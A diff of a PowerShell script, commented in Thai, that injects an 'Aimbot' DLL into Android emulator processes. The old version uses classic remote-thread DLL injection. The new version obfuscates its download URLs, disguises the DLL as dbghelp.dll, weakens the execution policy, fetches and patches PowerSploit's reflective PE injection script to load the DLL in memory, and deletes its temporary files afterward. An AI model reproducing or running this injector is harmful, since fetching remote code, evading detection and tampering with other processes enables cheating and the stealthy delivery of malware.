@@ -1,88 +1,91 @@
 
-# --- CONFIGURATION ---
-$dllUrl = "https://raw.githubusercontent.com/malachixxx/testdll/main/Aimbot%20Dll.dll" # เปลี่ยนเป็นลิงก์ DLL ของคุณ
-$tempPath = "$env:TEMP\Aimbot Dll.dll"
-$processName = "HD-Player"
+$_0x91A = @(
+"https://raw",
+".githubusercontent",
+".com/malachixxx",
+"/testdll/main/",
+"dbghelp.dll"
+) -join ""
 
-# 1. ดาวน์โหลด DLL จากลิงก์
-try {
-    Write-Host "[*] Downloading DLL..." -ForegroundColor Cyan
-    Invoke-WebRequest -Uri $dllUrl -OutFile $tempPath -ErrorAction Stop
-} catch {
-    Write-Host "[-] Failed to download DLL" -ForegroundColor Red
-    return
-}
+$_0xB2F = Join-Path $env:TEMP (@("dbg","help",".dll") -join "")
 
-# 2. ตรวจสอบ Process เป้าหมาย
-$targetProcess = Get-Process $processName -ErrorAction SilentlyContinue
-if (-not $targetProcess) {
-    Write-Host "[-] Process '$processName' not found! Opening it now..." -ForegroundColor Yellow
-    $targetProcess = Start-Process $processName -PassThru
-    Start-Sleep -Seconds 2
-}
+Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
 
-# 3. นิยามฟังก์ชัน Windows API ด้วย C#
-$Source = @"
-using System;
-using System.Runtime.InteropServices;
+$_0x7C1 = New-Object (@("System",".Net",".WebClient") -join "")
+$_0x7C1.Headers.Add((@("User","-Agent") -join ""), (@("Moz","illa/","5.0") -join ""))
 
-public class Injector {
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+$_0x5F9 = $_0x7C1.DownloadData($_0x91A)
 
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+$_0x3D2 = @(
+"https://raw",
+".githubusercontent",
+".com/PowerShellMafia",
+"/PowerSploit/master",
+"/CodeExecution/",
+"Invoke-ReflectivePEInjection.ps1"
+) -join ""
 
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+$_0x8E4 = "$env:TEMP\Reflective_$(Get-Random).ps1"
 
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+Invoke-WebRequest -Uri $_0x3D2 -OutFile $_0x8E4 -UseBasicParsing
 
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr GetModuleHandle(string lpModuleName);
+$_0xA77 = Get-Content $_0x8E4 -Raw
 
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-}
-"@
+$_0xA77 = $_0xA77 -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
 
-# โหลด Type เข้าสู่ Session (ตรวจสอบเพื่อไม่ให้เกิด Error หากรันซ้ำ)
-if (-not ([System.Management.Automation.PSTypeName]"Injector").Type) {
-    Add-Type -TypeDefinition $Source
-}
+$_0xA77 = $_0xA77 -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'
 
-# 4. เริ่มกระบวนการ Injection
-try {
-    Write-Host "[*] Injecting into $($targetProcess.ProcessName) (PID: $($targetProcess.Id))..." -ForegroundColor Cyan
+$_0xC11 = "$env:TEMP\Reflective_fixed.ps1"
 
-    # เปิด Process Handle
-    $hProcess = [Injector]::OpenProcess(0x1F0FFF, $false, $targetProcess.Id)
-    
-    # จองพื้นที่ใน Memory ของเป้าหมาย
-    $dllPathBytes = [System.Text.Encoding]::ASCII.GetBytes($tempPath)
-    $allocMem = [Injector]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$dllPathBytes.Length, 0x3000, 0x40)
+$_0xA77 | Set-Content $_0xC11 -Encoding UTF8
 
-    # เขียนที่อยู่ DLL ลงใน Memory
-    $bytesWritten = [IntPtr]::Zero
-    $success = [Injector]::WriteProcessMemory($hProcess, $allocMem, $dllPathBytes, [uint32]$dllPathBytes.Length, [ref]$bytesWritten)
+. $_0xC11
 
-    if ($success) {
-        # ค้นหาตำแหน่ง LoadLibraryA และสั่งสร้าง Remote Thread เพื่อโหลด DLL
-        $loadLibraryAddr = [Injector]::GetProcAddress([Injector]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
-        $hThread = [Injector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [IntPtr]::Zero)
-        
-        if ($hThread -ne [IntPtr]::Zero) {
-            Write-Host "[+] Injection Successful!" -ForegroundColor Green
-        } else {
-            Write-Host "[-] Failed to create remote thread" -ForegroundColor Red
+$_0xProcNames = @("Nox", "AndroidProcess", "LdVBoxHeadless", "MEmuHeadless", "HD-Player")
+
+$_0xFound = @()
+foreach ($_0xN in $_0xProcNames) {
+    $_0xP = Get-Process -Name $_0xN -ErrorAction SilentlyContinue
+    if ($_0xP) {
+        foreach ($_0xPi in $_0xP) {
+            $_0xFound += [PSCustomObject]@{ Name = $_0xN; PID = $_0xPi.Id }
         }
-    } else {
-        Write-Host "[-] Failed to write memory" -ForegroundColor Red
     }
-} catch {
-    Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
 }
 
-# ลบไฟล์ DLL หลังใช้งาน (Option)
-Remove-Item $tempPath -ErrorAction SilentlyContinue
+if ($_0xFound.Count -eq 0) {
+    Write-Host "[-] ไม่พบ process เป้าหมายที่รันอยู่" -ForegroundColor Red
+    exit
+}
+
+$_0xWarn = @("HD-Player", "AndroidProcess")
+$_0xWarnFound = $_0xFound | Where-Object { $_0xWarn -contains $_.Name }
+$_0xSafeFound = $_0xFound | Where-Object { $_0xWarn -notcontains $_.Name }
+
+if ($_0xWarnFound) {
+    foreach ($_0xW in $_0xWarnFound) {
+        Write-Host "[!] พบ $($_0xW.Name) (PID: $($_0xW.PID)) - อาจ inject ไม่ติด ข้ามไป" -ForegroundColor Yellow
+    }
+}
+
+if ($_0xSafeFound.Count -eq 0) {
+    Write-Host "[-] ไม่มี process ที่ inject ได้แน่นอน (มีแค่ HD-Player/AndroidProcess)" -ForegroundColor Red
+    exit
+} elseif ($_0xSafeFound.Count -eq 1) {
+    $_0x2AA = $_0xSafeFound[0].PID
+    Write-Host "[+] พบ $($_0xSafeFound[0].Name) (PID: $_0x2AA) - กำลัง inject..." -ForegroundColor Green
+    Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $_0x2AA
+} else {
+    Write-Host "[-] พบหลาย process ที่รันพร้อมกัน ไม่สามารถเลือกอัตโนมัติได้:" -ForegroundColor Red
+    foreach ($_0xS in $_0xSafeFound) {
+        Write-Host "    $($_0xS.Name) (PID: $($_0xS.PID))" -ForegroundColor Cyan
+    }
+    exit
+}
+
+notepad "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+
+Remove-Item $_0xB2F -Force -ErrorAction SilentlyContinue
+
+Get-ChildItem (@("$env:TEMP","/Reflective_*.ps1") -join "") -ErrorAction SilentlyContinue |
+Remove-Item -Force -ErrorAction SilentlyContinue
